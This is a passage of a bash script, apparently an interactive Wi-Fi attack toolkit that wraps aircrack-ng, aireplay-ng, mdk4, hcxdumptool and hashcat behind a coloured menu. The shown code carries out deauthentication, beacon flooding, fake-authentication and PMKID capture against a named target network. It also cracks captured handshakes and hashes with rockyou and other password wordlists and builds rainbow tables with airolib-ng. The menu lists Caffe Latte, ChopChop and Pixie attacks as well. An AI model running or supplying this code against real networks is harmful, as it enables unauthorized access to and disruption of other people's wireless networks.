...
function dependencies(){
	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool)
...
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] This attack keep listening and searching for handshakes when a user connect to the AP [${endColour}${yellowColour}WPA ${endColour}${blueColour}and${endColour}${yellowColour} WEP${endColour}${blueColour}]${endColour}"
sleep 0.1
...
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}10${endColour}${blueColour}] Caffe Latte  Attack:${endColour}"
sleep 0.1
}
...
function active_card(){
	...
	if [ "$status_card" == "${netCard}mon" ]; then
		...
		echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Your network card is: ${endColour}${redColour}Offline${endColour}"
	fi
}
...
function ask_data1(){
	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Name of your target network: ${endColour}" && read name
...
function ask_dict(){
	...
	if [ "$dic_option" == "1" ]; then
		wordlist_to_use="/usr/share/wordlists/rockyou.txt"
	fi

	if [ "$dic_option" == "2" ]; then
		wordlist_to_use="/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"
	fi

	if [ "$dic_option" == "3" ]; then
		wordlist_to_use="/usr/share/seclists/Passwords/darkweb2017-top10000.txt"
	fi
}
...
function handshake_crack(){
	...
	if [ "$(echo $?)" == "0" ]; then
		...
		sleep 0.3
		rainbow-gen
		aircrack-ng -r rainbowtable Capture-01.cap
		sleep 0.3
...
function rainbow-gen(){
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Computing rainbow tables...${endColour}"
	sleep 0.3
	head -n 1000000 ${wordlist_to_use} > wef-wordlist.txt
	airolib-ng rainbowtable --import passwd wef-wordlist.txt
	echo "${name}" > essid.tmp
	airolib-ng rainbowtable --import essid essid.tmp
	timeout 60 bash -c "airolib-ng --batch"
	echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Rainbow table created${endColour}"
}
...
function deauth_attack(){
    ...
    sleep 1.3
    xterm -hold -e "airodump-ng -c $channel -w Capture --essid $name ${netCard}mon" &
    air2_PID=$!

    sleep 5
    xterm -hold -e "aireplay-ng -0 10 -e $name -c FF:FF:FF:FF:FF:FF ${netCard}mon" &
    aireplay_PID=$!
    sleep "${attack_time}"
    ...
    echo -e "\n${blueColour}[${endColour}${grenColour}+${endColour}${blueColour}] Attack completed${endColour}"
    sleep 0.3
...
function pkmid_crack(){
    ...
    if [ "$(echo $?)" == "0" ]; then
        ...
        ask_dict
        sleep 0.4
        hashcat -m 16800 "${wordlist_to_use}" pkmid_hashes -d 1 --force 2>/dev/null
        sleep 0.3
        echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Cracking process completed${endColour}"
        sleep 1
        keep_exit
...
function auth_attack(){
    ...
    xterm -hold -e "aireplay-ng 1 -0" &
    aireplay_PID=$!
    sleep "${attack_time}"
    kill -9 ${aireplay_PID}; wait ${aireplay_PID} 2>/dev/null
    sleep 0.1
    kill -9 $air2_PID; wait $air2_PID 2>/dev/null
    echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Attack completed${endColour}"
    sleep 1.5
    keep_exit
}
...
function beacon_flood(){
	...
	sleep 1
	xterm -hold -e "mdk4 ${netCard}mon b -c ${channel}" &
	beacon_PID=$!
	sleep "${attack_time}"
	kill -9 $beacon_PID; wait $beacon_PID 2>/dev/null
	sleep 0.3
	echo -e "\n${blueColour}[${endColour}${grenColour}+${endColour}${blueColour}] Beacon Flood attack completed${endColour}"
	sleep 1.5
	keep_exit
}
...
function pkmid_attack(){
	...
	sleep 1
	timeout 120 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o pkmid_capture"
	sleep 1
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Obtaining hashes...${endColour}"
	sleep 1.3
	hcxpcaptool -z pkmid_hashes pkmid_capture; rm pkmid_capture
...
if [ "$(id -u)" == "0" ]; then
	...
	if [ "$netCard" ]; then
		...
		while true; do
			...
			sleep 0.1
			echo -e "${blueColour}[${endColour}${yellowColour}3${endColour}${blueColour}] Fake-Auth Attack${endColour}\t\t${blueColour}[${endColour}${yellowColour}12${endColour}${blueColour}] ChopChop Attack${endColour}"
			sleep 0.1
			...
			if [ "$option" == "1" ] || [ "$option" == "beacon" ]; then
				sleep 0.15
				beacon_attack
			fi

			if [ "$option" == "2" ] || [ "$option" == "deauth" ]; then
				sleep 0.15
			...
			if [ "$option" == "6" ] || [ "$option" == "randomize" ]; then
			...
			if [ "$option" == "10" ] || [ "$option" == "pixie" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
			...
			if [ "$option" == "11" ] || [ "$option" == "caffe" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				if [ "$mon_check" == "${netCard}mon" ]; then
					caffe-latte
			...
			if [ "$option" == "secret" ] || [ "$option" == "99" ]; then
				secret
				sleep 3
			fi
		done
	...
	echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Please, execute the program as root${endColour}\n"
	exit 1
